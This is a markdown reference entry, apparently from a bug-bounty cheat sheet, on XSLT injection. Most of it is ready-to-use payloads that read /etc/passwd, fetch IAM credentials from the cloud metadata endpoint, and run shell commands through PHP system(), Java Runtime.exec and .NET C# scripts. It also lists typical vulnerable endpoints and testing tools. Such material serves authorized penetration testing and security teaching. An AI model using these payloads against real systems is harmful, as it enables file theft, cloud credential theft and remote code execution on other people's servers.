---
id: "xslt-injection"
title: "XSLT Injection"
type: "technique"
category: "web-application"
subcategory: "injection"
tags: ["xslt", "xml", "injection", "ssrf", "rce", "file-read", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["xxe", "ssti-payloads", "el-injection"]
difficulty: "advanced"
updated: "2026-04-14"
---

# XSLT Injection

## Why XSLT Injection is Devastating
XSLT processors can read files, make HTTP requests, and execute code. Rare but devastating when found. $5k–$25k.

## File Read
```xml
<!-- XSLT 1.0 -->
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('/etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>

<!-- XSLT 2.0 -->
<xsl:value-of select="unparsed-text('/etc/passwd','utf-8')"/>
```

## SSRF
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
  </xsl:template>
</xsl:stylesheet>
```

## RCE via PHP (libxslt)
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system','id')"/>
  </xsl:template>
</xsl:stylesheet>
```

## RCE via Java (Xalan)
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtobject,'id')"/>
  </xsl:template>
</xsl:stylesheet>
```

## RCE via .NET (MSXML)
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:cs="urn:cs">
  <msxsl:script language="C#" implements-prefix="cs">
    public string exec(string cmd) {
      return System.Diagnostics.Process.Start("cmd.exe","/c "+cmd).StandardOutput.ReadToEnd();
    }
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="cs:exec('whoami')"/>
  </xsl:template>
</xsl:stylesheet>
```

## Where to Find This
- XML/XSLT transformation endpoints
- Report generation using XSLT
- PDF generators that transform XML via XSLT
- SOAP web services with XSLT processing
- CMS with XML theming (Umbraco)
- Data import/export accepting XML+XSLT

## Tools
- xsltproc (local testing)
- Saxon (XSLT 2.0/3.0 processor)
- Burp Suite for intercepting XSLT submissions
- nuclei XSLT injection templates
